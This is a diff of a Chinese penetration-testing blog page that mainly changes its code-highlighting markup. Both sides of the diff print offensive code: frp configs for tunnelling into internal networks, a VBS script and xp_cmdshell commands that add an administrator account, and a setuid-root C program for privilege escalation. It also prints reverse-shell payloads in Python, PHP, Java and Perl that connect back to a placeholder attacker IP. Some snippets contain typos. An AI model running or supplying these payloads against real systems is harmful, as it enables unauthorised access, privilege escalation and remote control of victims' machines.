@@ -580,6 +580,21 @@
         
  <!-- prismjs 代码高亮 -->
  
+    
+    <link href="/js/prism/prism-line-numbers.css" rel="stylesheet">
+    
+        <link href="/js/prism/prism-coy.min.css" rel="stylesheet">
+    
+
+    <style>
+        pre[class*="language-"] {
+            overflow-y: hidden;
+        }
+        .line-numbers .line-numbers-rows {
+            border: none;
+        }
+    </style>
+  
 
 
 <div class="bg-dark-floor" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -1;"></div>
@@ -1052,7 +1067,12 @@
 <p>修改frp.ini<br>文件格式：</p>
 </blockquote>
 <blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;[common]</span><br><span class="line">&gt;&gt;bind_port = 7000 #frp服务器监听㐰</span><br><span class="line">&gt;&gt;dashboard_port = 7500 #web后台监听端口</span><br><span class="line">&gt;&gt;dashboard_user =admin #web后台用户名及密码</span><br><span class="line">&gt;&gt;dashboard_pwd = admin</span><br><span class="line">&gt;&gt;token = 123456 #客户端和服务器的连接口令</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-1" data-language="1"><code class="language-1">&gt;&gt;[common]
+&gt;&gt;bind_port &#x3D; 7000 #frp服务器监听㐰
+&gt;&gt;dashboard_port &#x3D; 7500 #web后台监听端口
+&gt;&gt;dashboard_user &#x3D;admin #web后台用户名及密码
+&gt;&gt;dashboard_pwd &#x3D; admin
+&gt;&gt;token &#x3D; 123456 #客户端和服务器的连接口令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 </blockquote>
 <blockquote>
 <p>运行frps服务器端 <code>./frps -c frps.ini</code> #-c意思是加载配置文件<br>访问x.x.x.x:7500，使用自己设置的用户名和密码登录</p>
@@ -1064,7 +1084,22 @@
 <p>修改frpc.ini文件</p>
 </blockquote>
 <blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;[common]</span><br><span class="line">&gt;&gt;server_addr = 192.168.152.217</span><br><span class="line">&gt;&gt;#服务端IP地址</span><br><span class="line">&gt;&gt;server_port = 7000</span><br><span class="line">&gt;&gt;#服务器端口</span><br><span class="line">&gt;&gt;token = 123456</span><br><span class="line">&gt;&gt;#服务器上设置的连接口令</span><br><span class="line">&gt;&gt;[http]</span><br><span class="line">&gt;&gt;#自定义规则，[xxx]表示规则名</span><br><span class="line">&gt;&gt;type = tcp</span><br><span class="line">&gt;&gt;#type:转发的协议类型</span><br><span class="line">&gt;&gt;local_ip = 127.0.0.1</span><br><span class="line">&gt;&gt;local_port = 3389</span><br><span class="line">&gt;&gt;#本地应用的端口号</span><br><span class="line">&gt;&gt;remote_port = 7001</span><br><span class="line">&gt;&gt;#这条规则在服务端开放的端口号</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-1" data-language="1"><code class="language-1">&gt;&gt;[common]
+&gt;&gt;server_addr &#x3D; 192.168.152.217
+&gt;&gt;#服务端IP地址
+&gt;&gt;server_port &#x3D; 7000
+&gt;&gt;#服务器端口
+&gt;&gt;token &#x3D; 123456
+&gt;&gt;#服务器上设置的连接口令
+&gt;&gt;[http]
+&gt;&gt;#自定义规则，[xxx]表示规则名
+&gt;&gt;type &#x3D; tcp
+&gt;&gt;#type:转发的协议类型
+&gt;&gt;local_ip &#x3D; 127.0.0.1
+&gt;&gt;local_port &#x3D; 3389
+&gt;&gt;#本地应用的端口号
+&gt;&gt;remote_port &#x3D; 7001
+&gt;&gt;#这条规则在服务端开放的端口号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 </blockquote>
 <blockquote>
 <p>配置完成frp.ini后，cmd运行frpc(和服务端一样-c指定配置文件)<br>在局域网外客户端连接服务端的remote_port端口</p>
@@ -1287,7 +1322,15 @@
 <li>sql命令创建添加vbs脚本</li>
 </ol>
 <p>vbs提权脚本：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">set wsnetwork=CreateObject(&quot;WSCRIPT.NETWORK&quot;)</span><br><span class="line">os=&quot;WinNT://&quot;&amp;wsnetwork.ComputerName</span><br><span class="line">Set ob=GetObject(os) #得到adsi接口</span><br><span class="line">Set oe=GetObject(os&amp;&quot;/Administrators,group&quot;) #用户组</span><br><span class="line">Set od=ob.Create(&quot;user&quot;,&quot;name&quot;) #name为用户名</span><br><span class="line">od.SetPassword &quot;passwd&quot; #passwd为密码</span><br><span class="line">od.SetInfo #保存</span><br><span class="line">Set of=GetObject(os&amp;&quot;/name&quot;,user) #得到用户</span><br><span class="line">oe.add os&amp;&quot;/name&quot;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">set wsnetwork&#x3D;CreateObject(&quot;WSCRIPT.NETWORK&quot;)
+os&#x3D;&quot;WinNT:&#x2F;&#x2F;&quot;&amp;wsnetwork.ComputerName
+Set ob&#x3D;GetObject(os) #得到adsi接口
+Set oe&#x3D;GetObject(os&amp;&quot;&#x2F;Administrators,group&quot;) #用户组
+Set od&#x3D;ob.Create(&quot;user&quot;,&quot;name&quot;) #name为用户名
+od.SetPassword &quot;passwd&quot; #passwd为密码
+od.SetInfo #保存
+Set of&#x3D;GetObject(os&amp;&quot;&#x2F;name&quot;,user) #得到用户
+oe.add os&amp;&quot;&#x2F;name&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <ul>
 <li>sql命令创建</li>
@@ -1351,12 +1394,14 @@
 <ol>
 <li>开启xp_cmdshell</li>
 </ol>
-<figure class="highlight plaintext"><figcaption><span>sp_configure 'show advance options',1;//允许修改高级参数</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reconfigure;</span><br><span class="line">exec sp_configure &#x27;xp_cmshell&#x27;,1;//打开xp_cmdshell扩展</span><br><span class="line">reconfigure;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-exec" data-language="exec"><div class="caption"><span>sp_configure 'show advance options',1;//允许修改高级参数</span></div><code class="language-exec">reconfigure;
+exec sp_configure &#39;xp_cmshell&#39;,1;&#x2F;&#x2F;打开xp_cmdshell扩展
+reconfigure;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <ol start="2">
 <li>xp_cmdshell执行命令</li>
 </ol>
-<figure class="highlight plaintext"><figcaption><span>master..xp_cmdshell 'net user name passwd</span><a href="/add'//添加用户name,密码passwd">link</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#x27;net localgroup administrators name /add&#x27;//添加name到管理员组</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-exec" data-language="exec"><div class="caption"><span>master..xp_cmdshell 'net user name passwd</span><a href="/add'//添加用户name,密码passwd">link</a></div><code class="language-exec">exec master..xp_cmdshell &#39;net localgroup administrators name &#x2F;add&#39;&#x2F;&#x2F;添加name到管理员组<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <h3 id="windows-bypass-uac"><a href="#windows-bypass-uac" class="headerlink" title="windows bypass uac"></a>windows bypass uac</h3><p>uac(user acount control)可以阻止未授权的应用程序自动安装，并防止无意中更改系统设置</p>
 <blockquote>
@@ -1414,7 +1459,11 @@
 <p>简而言之，任何用户执行有suid的文件时，都会以第一个权限运行</p>
 <blockquote>
 <p>所以利用suid提权的一个小案例就是：<br>创建一个1.c文件,代码如下：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line">&gt;<span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">&gt;setuid(<span class="number">0</span>); <span class="meta">#root的uid=0，意味着执行后面的代码是root权限在执行</span></span><br><span class="line">&gt;system(<span class="string">&quot;su - root);#将当前环境转为root</span></span><br><span class="line"><span class="string">&gt;&#125;</span></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token operator">></span>#include<span class="token operator">&lt;</span>unistd<span class="token punctuation">.</span>h<span class="token operator">></span>
+<span class="token operator">></span><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+<span class="token operator">></span><span class="token function">setuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> #root的uid<span class="token operator">=</span><span class="token number">0</span>，意味着执行后面的代码是root权限在执行
+<span class="token operator">></span><span class="token function">system</span><span class="token punctuation">(</span>"su <span class="token operator">-</span> root<span class="token punctuation">)</span><span class="token punctuation">;</span>#将当前环境转为root
+<span class="token operator">></span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>gcc 1.c -o 1编译<br>chmod u+s 1 添加suid<br>.&#x2F;1 执行<br>su - root !&#x3D;su root.su 只是切换了root身份，但shell环境依旧是普通用户，su - 用户和环境一起切换了。</p>
 </blockquote>
@@ -1474,13 +1523,30 @@
 </tr>
 </tbody></table>
 </blockquote>
-<h2 id="其他反弹shell方式"><a href="#其他反弹shell方式" class="headerlink" title="其他反弹shell方式"></a>其他反弹shell方式</h2><h3 id="python反弹shell"><a href="#python反弹shell" class="headerlink" title="python反弹shell"></a>python反弹shell</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> soket,subprocess,os;</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;攻击机IP&quot;</span>,监听端口号));</span><br><span class="line">os.dup(s.fileno(),<span class="number">0</span>);</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>);</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>);</span><br><span class="line">p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="其他反弹shell方式"><a href="#其他反弹shell方式" class="headerlink" title="其他反弹shell方式"></a>其他反弹shell方式</h2><h3 id="python反弹shell"><a href="#python反弹shell" class="headerlink" title="python反弹shell"></a>python反弹shell</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> soket<span class="token punctuation">,</span>subprocess<span class="token punctuation">,</span>os<span class="token punctuation">;</span>
+s<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span><span class="token punctuation">;</span>s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"攻击机IP"</span><span class="token punctuation">,</span>监听端口号<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+os<span class="token punctuation">.</span>dup<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+p<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span><span class="token string">"-i"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h3 id="php反弹shell"><a href="#php反弹shell" class="headerlink" title="php反弹shell"></a>php反弹shell</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sock</span>=<span class="title function_ invoke__">fsockopen</span>(<span class="string">&quot;攻击机IP&quot;</span>,监听端口);</span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);</span><br></pre></td></tr></table></figure>
+<h3 id="php反弹shell"><a href="#php反弹shell" class="headerlink" title="php反弹shell"></a>php反弹shell</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sock</span><span class="token operator">=</span><span class="token function">fsockopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"攻击机IP"</span><span class="token punctuation">,</span>监听端口<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/bin/sh -i &lt;&amp;3 >&amp;3 2>&amp;3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<h3 id="java反弹shell"><a href="#java反弹shell" class="headerlink" title="java反弹shell"></a>java反弹shell</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/攻击机ip/监听端口;cat &lt;&amp;5 | while read line;do $line 2&gt;&amp;5&gt;&amp;5;done&quot;</span>] as String[])</span><br><span class="line">p.waitFor()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="java反弹shell"><a href="#java反弹shell" class="headerlink" title="java反弹shell"></a>java反弹shell</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java">r <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+p <span class="token operator">=</span> r<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"exec 5&lt;>/dev/tcp/攻击机ip/监听端口;cat &lt;&amp;5 | while read line;do $line 2>&amp;5>&amp;5;done"</span><span class="token punctuation">]</span> as <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span><span class="token function">waitFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<h3 id="perl-反弹shell"><a href="#perl-反弹shell" class="headerlink" title="perl 反弹shell"></a>perl 反弹shell</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> Socket;</span><br><span class="line">$i=<span class="string">&quot;攻击机IP地址&quot;</span>;</span><br><span class="line">$p=监听端口号;<span class="keyword">socket</span>(S,PF_INET,SOCK_STREAM,<span class="keyword">getprotobyname</span>(<span class="string">&quot;tcp&quot;</span>));<span class="keyword">if</span>(<span class="keyword">connect</span>(S,sockaddr_in($p,inet_aton($i))))&#123;</span><br><span class="line">(<span class="keyword">open</span>(STDIN,<span class="string">&quot;&gt;&amp;S&quot;</span>);</span><br><span class="line"><span class="keyword">open</span>(STDOUT,<span class="string">&quot;&gt;&amp;S&quot;</span>);</span><br><span class="line"><span class="keyword">open</span>(STDERR,<span class="string">&quot;&gt;&amp;S&quot;</span>);</span><br><span class="line"><span class="keyword">exec</span>(<span class="string">&quot;/bin/sh -i&quot;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<h3 id="perl-反弹shell"><a href="#perl-反弹shell" class="headerlink" title="perl 反弹shell"></a>perl 反弹shell</h3><pre class="line-numbers language-perl" data-language="perl"><code class="language-perl"><span class="token keyword">use</span> Socket<span class="token punctuation">;</span>
+<span class="token variable">$i</span><span class="token operator">=</span><span class="token string">"攻击机IP地址"</span><span class="token punctuation">;</span>
+<span class="token variable">$p</span><span class="token operator">=</span>监听端口号<span class="token punctuation">;</span>socket<span class="token punctuation">(</span>S<span class="token punctuation">,</span>PF_INET<span class="token punctuation">,</span>SOCK_STREAM<span class="token punctuation">,</span>getprotobyname<span class="token punctuation">(</span><span class="token string">"tcp"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>connect<span class="token punctuation">(</span>S<span class="token punctuation">,</span>sockaddr_in<span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">,</span>inet_aton<span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+<span class="token punctuation">(</span>open<span class="token punctuation">(</span>STDIN<span class="token punctuation">,</span><span class="token string">">&amp;S"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+open<span class="token punctuation">(</span>STDOUT<span class="token punctuation">,</span><span class="token string">">&amp;S"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+open<span class="token punctuation">(</span>STDERR<span class="token punctuation">,</span><span class="token string">">&amp;S"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+exec<span class="token punctuation">(</span><span class="token string">"/bin/sh -i"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>perl和python绝大多数服务器都会装，所以很有用</p>
 <p>以某次内网渗透为实例</p>
@@ -1523,10 +1589,18 @@
 <p>lcx被检测概率太大，用<strong>frp</strong></p>
 <h4 id="二层内网渗透-frp工具reverse"><a href="#二层内网渗透-frp工具reverse" class="headerlink" title="二层内网渗透(frp工具reverse)"></a>二层内网渗透(frp工具reverse)</h4><p>关于frp要分清楚客户端和服务端到底应该放在哪。具体可以看&#x3D;&#x3D;frpc.ini&#x3D;&#x3D;和&#x3D;&#x3D;frps.ini&#x3D;&#x3D;</p>
 <p>比如某frpc.ini的内容</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr=172.16.12.2</span><br><span class="line">server_port=7100</span><br><span class="line">[ssh]</span><br><span class="line">type=tcp</span><br><span class="line">local_ip=127.0.0.1</span><br><span class="line">local_port=5000</span><br><span class="line">remote_port=5000</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">[common]
+server_addr&#x3D;172.16.12.2
+server_port&#x3D;7100
+[ssh]
+type&#x3D;tcp
+local_ip&#x3D;127.0.0.1
+local_port&#x3D;5000
+remote_port&#x3D;5000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>如上，客户端连接服务端的7000端口，是将本机的5000端口数据以tcp转发到172.16.12.2的5000端口。因为你开frp也需要端口的嘛。这样连接服务端的5000端口就相当于连接客户端的5000端口。<br>服务端只有两行，监听一下就行了</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port=7100</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">[common]
+bind_port&#x3D;7100<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>这里，我要强调本文的精华</p>
 <h4 id="x3D-x3D-frp端口转发与内网穿透-x3D-x3D"><a href="#x3D-x3D-frp端口转发与内网穿透-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;frp端口转发与内网穿透&#x3D;&#x3D;"></a>&#x3D;&#x3D;frp端口转发与内网穿透&#x3D;&#x3D;</h4><p><img src="https://storage.tttang.com/media/attachment/2022/10/29/f4087477-330a-4eef-acf2-0b6b27097858.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/f4087477-330a-4eef-acf2-0b6b27097858.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
